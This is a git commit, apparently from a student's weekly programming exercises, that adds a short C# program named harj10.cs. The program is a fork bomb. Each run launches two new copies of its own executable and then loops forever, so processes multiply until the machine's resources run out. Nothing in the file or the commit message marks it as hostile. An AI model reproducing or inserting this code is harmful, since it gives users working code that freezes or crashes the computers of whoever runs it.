0de8ba6b7b70c2ac7749b049df03183b2d377454
Ilpo Loikkanen <l4538@student.jamk.fi>
2018-01-18 13:17:23 +0200

    added w3 harj10

---
+++ w3/harj10.cs
@@ -0,0 +1,14 @@
+﻿﻿using System;
+
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            System.Diagnostics.Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
+            System.Diagnostics.Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
+            while (true)
+            {
+                Console.ReadKey();
+            }
+        }
+    }
